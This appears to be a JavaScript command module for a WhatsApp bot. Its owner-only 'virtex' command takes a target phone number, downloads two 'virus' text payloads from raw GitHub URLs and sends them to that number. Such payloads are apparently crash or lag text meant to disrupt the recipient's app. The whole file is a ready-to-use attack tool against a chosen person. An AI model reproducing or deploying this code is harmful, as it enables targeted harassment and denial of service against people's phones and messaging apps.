const { fetchJson } = require("../../utils");
module.exports = {
	name: "virtex",
	alias: ["vr"],
	owner: true,
	category: "private",
	async exec({ sock, msg, args}) {
		if(args.length == 0) msg.reply('Masukan Normor !')
		try {
			let no = args[0];
			let virus =  await fetchJson("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")
			virus +=  await fetchJson("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")
			await sock.sendMessage(no+'@s.whatsapp.net', {text: virus})
		} catch (e) {
			await msg.reply(e.message);
		}
	},
};